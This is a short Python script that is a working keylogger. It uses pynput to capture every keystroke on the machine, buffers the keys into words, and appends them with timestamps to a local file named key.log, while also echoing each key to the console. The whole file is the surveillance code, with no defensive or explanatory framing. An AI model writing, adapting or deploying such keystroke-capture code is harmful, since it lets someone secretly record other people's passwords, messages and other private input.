from pynput.keyboard import Key, Listener
import logging

word=''
word_count=0


logging.basicConfig(filename='key.log', filemode='a', level=logging.DEBUG,format='%(asctime)s %(message)s')


def on_press(key):
	global word , word_count
	
	if key==Key.space or key ==Key.enter:
		key=" "
	
	if word_count==10 or key==" ":
		word_count=0
		logging.info(word)
		word=str(key)[1:-1]
	
	elif word_count<10:
		word_count+=1
		print(f"the {key} key is pressed ")
		word+=str(key)[1:-1]

	

with Listener(on_press=on_press) as listener:
	listener.join()